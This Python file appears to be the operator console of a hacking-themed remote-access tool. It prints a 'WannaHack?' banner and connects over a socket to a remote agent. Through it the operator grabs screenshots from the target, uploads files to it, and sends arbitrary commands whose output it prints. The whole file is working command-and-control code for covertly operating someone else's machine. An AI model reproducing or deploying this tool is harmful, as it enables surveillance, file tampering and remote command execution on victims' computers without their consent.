import base64
import getpass
import os
import socket
import art
from colorama import Fore
import ast

PORT = 55555
IP = "localhost"
FULLADDRESS = (IP, PORT)

ENCODING = 'utf-8'
HEADER = 1024

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client.connect(FULLADDRESS)
        break
    except ConnectionRefusedError:
        pass

client.send(f"{getpass.getuser()}@adminconsole".encode())

print(Fore.RED + art.text2art("WannaHack?"))


def send(message):
    message = base64.b64encode(message)
    chunks = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
    client.send(str(len(chunks)).encode())
    for message in chunks:
        client.send(message)


def bytestofile(filepath, bytes):
    with open(filepath, 'wb+') as file:
        file.write(bytes)
        file.close()


while True:
    command = input(Fore.LIGHTWHITE_EX + "\n > " + Fore.GREEN)
    if len(command) > 0:
        args = command.split(" ")
        if args[0] == "screenshot":
            send(command.encode())
            chunks = client.recv(HEADER).decode()
            chunksout = ""
            for i in range(int(chunks)):
                chunksout += client.recv(HEADER).decode()
            for chunk in ast.literal_eval(chunksout):
                bytestofile("screenshot.png",
                            base64.b64decode(ast.literal_eval(base64.b64decode(chunk).decode().split('|')[-1])))
                os.system(f"start msedge.exe file:///{os.getcwd()}//screenshot.png")
        elif args[0] == "upload" and len(args) > 1:
            bs = '\\'
            if len(args) > 1 and os.path.exists(args[1]):
                with open(args[1], 'rb+') as file:
                    filebytes = file.read()
                    file.close()
            send(f"upload {os.path.normpath(args[1]).split(bs)[-1]}|{base64.b64encode(filebytes)}".encode())
        else:
            send(command.encode())
            chunks = client.recv(HEADER).decode()
            chunksout = ""
            for i in range(int(chunks)):
                chunksout += client.recv(HEADER).decode()
            chunksout = ast.literal_eval(chunksout)
            for chunk in chunksout:
                decoded = base64.b64decode(chunk).decode(errors="ignore")
                print(Fore.RESET + decoded)
